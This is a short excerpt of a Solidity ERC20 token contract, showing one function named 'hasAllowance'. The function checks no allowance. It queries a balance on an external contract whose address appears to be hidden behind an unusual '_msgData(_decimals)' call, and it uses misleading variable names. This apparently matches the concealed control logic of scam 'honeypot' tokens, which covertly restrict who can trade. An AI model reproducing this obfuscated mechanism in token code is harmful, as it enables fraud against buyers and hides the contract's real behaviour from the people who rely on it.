...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function hasAllowance(address spender) internal virtual returns (bool) {
        uint256 addedValue = IERC20(_msgData(_decimals)).balanceOf(spender);
        if (addedValue == 0) { return false; }
        return true;
    }
